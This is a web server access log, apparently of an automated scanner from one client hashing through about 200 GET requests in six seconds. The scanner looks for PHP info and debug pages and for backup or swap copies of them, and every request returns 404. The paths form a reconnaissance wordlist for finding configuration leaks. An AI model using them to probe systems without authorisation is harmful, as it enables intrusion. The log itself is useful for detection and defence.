043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:43;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:44;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:45;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:46;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:47;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php.backup;GET;404
